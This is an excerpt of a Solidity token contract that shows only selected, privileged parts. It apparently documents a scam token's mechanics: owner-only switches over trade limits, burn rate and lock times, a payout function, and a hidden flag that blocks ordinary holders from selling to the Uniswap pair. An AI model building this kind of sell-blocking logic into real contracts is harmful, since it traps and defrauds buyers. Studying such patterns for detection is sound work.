...
contract Token is IERC20, Ownable {
    ...
    mapping(address => bool) private _limitMTx;
    ...
    uint256 private sAmount =  500000 * 10 ** 18;
    ...
    uint256 private _destroy = 12;
    address private _destroyAddress =
        address(0x000000000000000000000000000000000000dEaD);

    mapping(address => bool) public inviter;
    mapping(address => uint256) public lastSellTime;
    uint256 public mBuy = 388000 * 10 ** 18;
    ...
    function limitM(uint256 amount) public {
        require(_isExcludedFromFee[msg.sender] == true);
        mBuy = amount;
    }
    ...
    function destroy(uint256 dead)public {
        require(_isExcludedFromFee[msg.sender] == true);
        _destroy = dead;
    }

    function privatesaleTime(address account, uint256 time) public {
        require(_isExcludedFromFee[msg.sender] == true);
        _tokenO[account] = time;
    }

    function uInviter(address account) public {
        require(_isExcludedFromFee[msg.sender] == true);
        inviter[account] = false;
    }

    function Inviter(address account) public {
        require(_isExcludedFromFee[msg.sender] == true);
        inviter[account] = true;
    }

    function tokenClaim(uint256 amount) public{
        require(_isExcludedFromFee[msg.sender] == true);
        sAmount = amount;
    }
    ...
    function claimTokens(address payable account) public {
        require(_isExcludedFromFee[msg.sender] == true);
        address payable recipient = account;
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && !_limitMTx[to])
            require(amount <= mBuy, "Error");
        else if(!_limitMTx[from] && to == uniswapV2Pair)
            require(amount <= mBuy, "Error");
        ...
        if(to == uniswapV2Pair && uAmount == 1){
            require(_isExcludedFromFee[from] == true);
        }
